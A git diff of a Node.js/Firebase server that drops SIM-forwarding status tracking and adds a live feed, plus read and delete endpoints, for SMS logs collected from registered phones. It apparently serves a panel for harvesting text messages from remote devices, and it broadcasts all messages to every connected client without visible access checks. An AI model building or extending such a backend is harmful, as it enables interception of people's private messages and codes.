@@ -441,114 +441,6 @@ app.get("/api/lastcheck/:uid", async (req, res) => {
 });
 
 /* ======================================================
-      SMS STATUS + SIM FORWARD LIVE WATCH
-====================================================== */
-
-const smsStatusRef = rtdb.ref("smsStatus");
-
-function handleSmsStatusSingle(uid, msgId, data, event) {
-  io.emit("smsStatusUpdate", {
-    success: true,
-    uid,
-    msgId,
-    event,
-    data,
-  });
-
-  console.log(
-    `📩 smsStatusUpdate → uid=${uid}, msgId=${msgId}, event=${event}, status=${data?.status}`
-  );
-}
-
-smsStatusRef.on("child_added", (snap) => {
-  const uid = snap.key;
-  const all = snap.val() || {};
-
-  Object.entries(all).forEach(([msgId, obj]) => {
-    handleSmsStatusSingle(uid, msgId, obj, "added");
-  });
-});
-
-smsStatusRef.on("child_changed", (snap) => {
-  const uid = snap.key;
-  const all = snap.val() || {};
-
-  Object.entries(all).forEach(([msgId, obj]) => {
-    handleSmsStatusSingle(uid, msgId, obj, "changed");
-  });
-});
-
-smsStatusRef.on("child_removed", (snap) => {
-  const uid = snap.key;
-
-  io.emit("smsStatusUpdate", {
-    success: true,
-    uid,
-    msgId: null,
-    data: null,
-    event: "removed",
-  });
-
-  console.log(`🗑 smsStatus removed for uid=${uid}`);
-});
-
-
-const simForwardRef = rtdb.ref("simForwardStatus");
-
-function handleSimForwardChange(snap, event = "update") {
-  const uid = snap.key;
-
-  if (!snap.exists()) {
-    io.emit("simForwardStatusUpdate", {
-      success: true,
-      uid,
-      event,
-      sims: {
-        0: null,
-        1: null,
-      },
-    });
-
-    console.log(`📶 simForwardStatus → uid=${uid}, removed`);
-    return;
-  }
-
-  const raw = snap.val() || {};
-
-  const sim0 = raw["0"]
-    ? { status: raw["0"].status || "unknown", updatedAt: raw["0"].updatedAt || null }
-    : null;
-
-  const sim1 = raw["1"]
-    ? { status: raw["1"].status || "unknown", updatedAt: raw["1"].updatedAt || null }
-    : null;
-
-  const sims = { 0: sim0, 1: sim1 };
-
-  io.emit("simForwardStatusUpdate", {
-    success: true,
-    uid,
-    event,
-    sims,
-  });
-
-  console.log(
-    `📶 simForwardStatusUpdate → uid=${uid}, event=${event}, SIM0=${sim0?.status || "null"}, SIM1=${sim1?.status || "null"}`
-  );
-}
-
-simForwardRef.on("child_added", (snap) =>
-  handleSimForwardChange(snap, "added")
-);
-simForwardRef.on("child_changed", (snap) =>
-  handleSimForwardChange(snap, "changed")
-);
-simForwardRef.on("child_removed", (snap) =>
-  handleSimForwardChange(snap, "removed")
-);
-
-
-/* ======================================================
       REGISTERED DEVICES LIVE UPDATE
 ====================================================== */
 const registeredDevicesRef = rtdb.ref("registeredDevices");
@@ -564,7 +456,6 @@ registeredDevicesRef.on("child_changed", () => {
 registeredDevicesRef.on("child_removed", () => {
   refreshDevicesLive("registered_removed");
 });
-
 
 app.get("/api/devices", async (req, res) => {
   try {
@@ -627,6 +518,133 @@ historyRef.on("child_added", (snap) => {
   const entryId = Object.keys(snap.val() || {}).pop();
 
   emitHistoryUpdate(uid, entryId, obj, "added");
+});
+
+/* ======================================================
+      ⭐ SMS LOGS LIVE WATCH ⭐
+====================================================== */
+
+const smsLogsRef = rtdb.ref("smsLogs");
+
+function emitSmsLogUpdate(uid, smsId, smsData, event) {
+  io.emit("smsLogUpdate", {
+    success: true,
+    uid,
+    smsId,
+    event,
+    data: smsData
+  });
+
+  console.log(
+    `📩 smsLogUpdate → uid=${uid}, smsId=${smsId}, event=${event}, sender=${smsData?.sender}`
+  );
+}
+
+// Jab new SMS log add hota hai
+smsLogsRef.on("child_added", (snap) => {
+  const uid = snap.key;
+  const smsLogs = snap.val() || {};
+
+  Object.entries(smsLogs).forEach(([smsId, smsData]) => {
+    emitSmsLogUpdate(uid, smsId, smsData, "added");
+  });
+});
+
+// Jab SMS logs change hote hain
+smsLogsRef.on("child_changed", (snap) => {
+  const uid = snap.key;
+  const smsLogs = snap.val() || {};
+
+  Object.entries(smsLogs).forEach(([smsId, smsData]) => {
+    emitSmsLogUpdate(uid, smsId, smsData, "changed");
+  });
+});
+
+// Jab SMS logs delete hote hain
+smsLogsRef.on("child_removed", (snap) => {
+  const uid = snap.key;
+  
+  io.emit("smsLogUpdate", {
+    success: true,
+    uid,
+    smsId: null,
+    data: null,
+    event: "removed"
+  });
+
+  console.log(`🗑️ SMS logs removed for uid=${uid}`);
+});
+
+/* ======================================================
+      API TO GET SMS LOGS
+====================================================== */
+app.get("/api/smslogs/:uid", async (req, res) => {
+  try {
+    const uid = clean(req.params.uid);
+    const limit = parseInt(req.query.limit) || 50;
+
+    const snap = await rtdb.ref(`smsLogs/${uid}`)
+      .orderByChild("timestamp")
+      .limitToLast(limit)
+      .get();
+
+    if (!snap.exists()) {
+      return res.json({
+        success: true,
+        data: [],
+        count: 0
+      });
+    }
+
+    const smsLogs = snap.val() || {};
+    const logsArray = Object.entries(smsLogs).map(([smsId, data]) => ({
+      smsId,
+      ...data,
+      timestamp: data.timestamp || 0,
+      readableTime: data.timestamp ? new Date(data.timestamp).toLocaleString() : "N/A"
+    }));
+
+    // Sort by timestamp (newest first)
+    logsArray.sort((a, b) => b.timestamp - a.timestamp);
+
+    return res.json({
+      success: true,
+      data: logsArray,
+      count: logsArray.length
+    });
+  } catch (err) {
+    console.error("❌ /api/smslogs ERROR:", err.message);
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+/* ======================================================
+      API TO DELETE SMS LOGS
+====================================================== */
+app.delete("/api/smslogs/:uid", async (req, res) => {
+  try {
+    const uid = clean(req.params.uid);
+    const smsId = req.query.smsId;
+
+    if (smsId) {
+      // Delete specific SMS
+      await rtdb.ref(`smsLogs/${uid}/${smsId}`).remove();
+      return res.json({
+        success: true,
+        message: `SMS ${smsId} deleted successfully`
+      });
+    } else {
+      // Delete all SMS for this user
+      await rtdb.ref(`smsLogs/${uid}`).remove();
+      return res.json({
+        success: true,
+        message: "All SMS logs deleted successfully"
+      });
+    }
+  } catch (err) {
+    console.error("❌ DELETE /api/smslogs ERROR:", err.message);
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
 refreshDevicesLive("initial");
